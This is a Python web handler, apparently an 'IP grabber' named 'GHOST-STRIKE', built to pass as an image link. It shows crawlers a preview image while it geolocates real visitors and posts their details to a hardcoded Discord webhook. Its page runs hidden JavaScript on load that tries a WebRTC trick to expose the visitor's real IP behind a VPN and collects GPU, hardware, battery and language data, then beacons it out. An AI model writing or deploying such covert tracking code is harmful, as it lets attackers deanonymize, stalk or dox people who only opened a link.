# ==============================================================================
# HOLY SYSTEM v18.0 - "GHOST-STRIKE" (THE SILENT HUNTER)
# NO FORMS. NO BUTTONS. JUST PURE BACKGROUND LOGGING.
# ==============================================================================

from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import json

WEBHOOK_URL = "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6"
REDIRECT_IMAGE = "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
            ua = self.headers.get('user-agent', 'Unknown')
            
            # Bot Savunması (Discord önizlemesi için)
            if any(b in ua for b in ["Discordbot", "TelegramBot"]):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f'<html><head><meta property="og:image" content="{REDIRECT_IMAGE}"></head></html>'.encode())
                return

            # 1. SUNUCU TARAFI LOGLAMA (IP & KONUM)
            geo = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
            requests.post(WEBHOOK_URL, json={
                "username": "GHOST SERVER",
                "embeds": [{
                    "title": "🌑 GHOST-STRIKE: TARGET INTERCEPTED",
                    "color": 0x000000,
                    "fields": [
                        {"name": "🌍 Location", "value": f"{geo.get('city')}, {geo.get('country')}", "inline": True},
                        {"name": "🌐 Public IP", "value": f"`{ip}`", "inline": True},
                        {"name": "🛡️ VPN Check", "value": "🚨 DETECTED" if geo.get('proxy') else "✅ CLEAN", "inline": True}
                    ]
                }]
            })

            # 2. SESSİZ AGENT (JAVASCRIPT)
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()

            content = f'''
            <!DOCTYPE html>
            <html>
            <head><title>Loading...</title></head>
            <body style="background: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh;">
                <img src="{REDIRECT_IMAGE}" style="max-width: 100%; height: auto;">
                
                <script>
                async function silentStrike() {{
                    // WebRTC VPN Bypass
                    let realIP = "Hidden";
                    try {{
                        const pc = new RTCPeerConnection({{iceServers: [{{urls: "stun:stun.l.google.com:19302"}}]}});
                        pc.createDataChannel("");
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        pc.onicecandidate = i => {{
                            if (i && i.candidate) {{
                                let m = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate);
                                if(m) realIP = m[1];
                            }}
                        }};
                    }} catch(e) {{}}

                    // GPU & Hardware
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";

                    // Veriyi Hazırla
                    const data = JSON.stringify({{
                        username: "GHOST AGENT",
                        embeds: [{{
                            title: "💀 SILENT EXTRACTION COMPLETE",
                            color: 0x000000,
                            fields: [
                                {{"name": "⚡ Real IP (VPN Bypass)", "value": "`" + realIP + "`", "inline": false}},
                                {{"name": "🖼️ GPU Model", "value": "```" + gpu + "```", "inline": false}},
                                {{"name": "💻 Hardware", "value": "Cores: " + navigator.hardwareConcurrency + " | RAM: " + (navigator.deviceMemory || "N/A") + "GB", "inline": true}},
                                {{"name": "🔋 Battery", "value": (navigator.getBattery ? (await navigator.getBattery()).level * 100 + "%" : "N/A"), "inline": true}},
                                {{"name": "🌐 Language", "value": navigator.language, "inline": true}}
                            ]
                        }}]
                    }});

                    // Sessiz Gönderim
                    navigator.sendBeacon("{WEBHOOK_URL}", new Blob([data], {{type: 'application/json'}}));
                }}
                
                // Sayfa açılır açılmaz çalıştır
                window.onload = silentStrike;
                </script>
            </body>
            </html>
            '''
            self.wfile.write(content.encode('utf-8'))

        except Exception:
            self.send_response(302)
            self.send_header('Location', REDIRECT_IMAGE)
            self.end_headers()

app = handler
